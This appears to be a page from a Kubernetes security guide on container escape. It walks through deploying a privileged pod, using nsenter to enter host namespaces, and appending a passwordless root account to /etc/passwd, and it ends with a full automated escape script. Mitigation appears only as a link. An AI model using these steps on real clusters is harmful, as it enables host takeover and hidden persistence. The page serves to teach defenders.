---
sidebar_position: 8
title: "Container Escape"
description: "How an attacker can break out of a container and gain control over the host system in Kubernetes."
---

# Container Escape

A **container escape** occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This can lead to **root-level access**, data tampering, persistence, and lateral movement across the cluster.

---

## Exploitation Steps: Breaking Out of the Container Runtime

An attacker targets a container with overly permissive configurations that allow host-level access.

### 1. Deploy a Privileged Pod

The attacker deploys a pod with elevated privileges, including:

- `privileged: true`
- `hostPID: true`
- `allowPrivilegeEscalation: true`
- `runAsUser: 0`

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  hostPID: true
  containers:
    - image: busybox
      name: test
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        allowPrivilegeEscalation: true
        privileged: true
  restartPolicy: Always
```

```bash
kubectl apply -f test-pod.yaml
```

---

### 2. Check the Container Environment

The attacker verifies if the container shares namespaces with the host.

```bash
ls -l /proc/1/ns/mnt
```

If the container can access `/proc/1/root`, it indicates potential for escape.

---

### 3. Escape into Host Namespaces

Using `nsenter`, the attacker enters the host’s namespace context:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

They verify the escape:

```bash
hostname
whoami
```

If the commands return the **host’s hostname** and **root user**, the escape is successful.

---

### 4. Add a Root User to the Host

For persistence, the attacker creates a root-level user:

```bash
echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd
grep attacker /etc/passwd
```

---

### 5. Execute an Automated Escape Script

The attacker may use a script to automate the entire process:

```bash
#!/bin/sh

echo "[*] Checking if the container has access to the host's root filesystem..."
if [ ! -d "/proc/1/root" ]; then
    echo "[-] Cannot access /proc/1/root. Escape is not possible."
    exit 1
fi

echo "[+] Host root filesystem detected at /proc/1/root."
echo "[*] Attempting to enter the host's namespaces..."

exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c '
    echo "[+] Successfully entered host namespaces."
    echo "[*] Adding attacker user to /etc/passwd..."
    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
    grep attacker /etc/passwd
    echo "[*] Checking system state..."
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
    ps aux | grep kubelet
    exec /bin/sh
'
```

---

### Result

The attacker gains **interactive root access to the host**, bypassing container isolation. They can persist by creating a new host user, modify system files, or pivot to other nodes.

---

## Mitigation

➡ [Preventing Container Escape](/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation)
